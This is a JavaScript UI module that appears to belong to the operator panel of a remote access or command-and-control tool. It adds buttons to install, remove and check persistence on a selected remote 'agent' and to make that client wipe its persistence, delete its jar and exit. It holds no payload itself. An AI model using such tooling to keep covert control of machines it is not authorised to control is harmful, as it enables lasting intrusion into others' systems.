import { $, on } from "../lib/dom.js";
import { api } from "../lib/api.js";

export function createPersistView(root, context) {
  const out = $("#persist-out", root);
  const mode = $("#persist-mode", root);
  const errors = $("#persist-err", root);

  const write = (text) => {
    out.textContent += text.endsWith("\n") ? text : `${text}\n`;
    out.scrollTop = out.scrollHeight;
  };

  const run = (action) => async () => {
    const id = context.agentId();
    if (!id) return;

    errors.textContent = "";
    try {
      const result = await api.persist(id, action, mode.value);
      write(`[${action}] ${result.output || "ok"}`);
    } catch (error) {
      errors.textContent = error.message;
    }
  };

  on($("#btn-persist-install", root), "click", run("install"));
  on($("#btn-persist-remove", root), "click", run("remove"));
  on($("#btn-persist-status", root), "click", run("status"));

  on($("#btn-selfdestruct", root), "click", async () => {
    const id = context.agentId();
    if (!id) return;
    if (!window.confirm("client will wipe persistence, delete its jar and exit. sure?")) return;

    errors.textContent = "";
    try {
      const result = await api.selfdestruct(id);
      write(`[self-destruct] ${result.output || "scheduled"}`);
    } catch (error) {
      errors.textContent = error.message;
    }
  });

  return {
    activate: () => {
      if (!context.agentId()) errors.textContent = "no client selected";
    },
    deactivate: () => {},
  };
}
